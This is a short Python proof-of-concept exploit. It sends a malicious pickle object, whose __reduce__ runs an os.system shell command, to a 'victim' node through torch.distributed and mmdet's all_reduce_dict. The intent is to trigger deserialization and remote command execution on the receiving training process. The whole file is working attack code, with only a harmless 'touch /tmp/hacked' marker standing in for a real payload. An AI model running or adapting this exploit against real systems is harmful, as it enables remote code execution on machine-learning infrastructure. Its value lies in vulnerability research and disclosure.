print('attacker script started')

import torch
import torch.distributed as dist
import mmdet.utils

print('running attacker')
# Define a malicious payload
class payload:
    def __reduce__(self):
        return (__import__('os').system, ("touch /tmp/hacked",))

# Initialize as sender (rank=0)
dist.init_process_group(backend="gloo", rank=0, world_size=2, init_method="tcp://victim:29500")

# Craft the malicious dictionary
print('payload')
py_dict = {payload(): "xxx"}
mmdet.utils.all_reduce_dict(py_dict)

print("Malicious payload sent to victim.")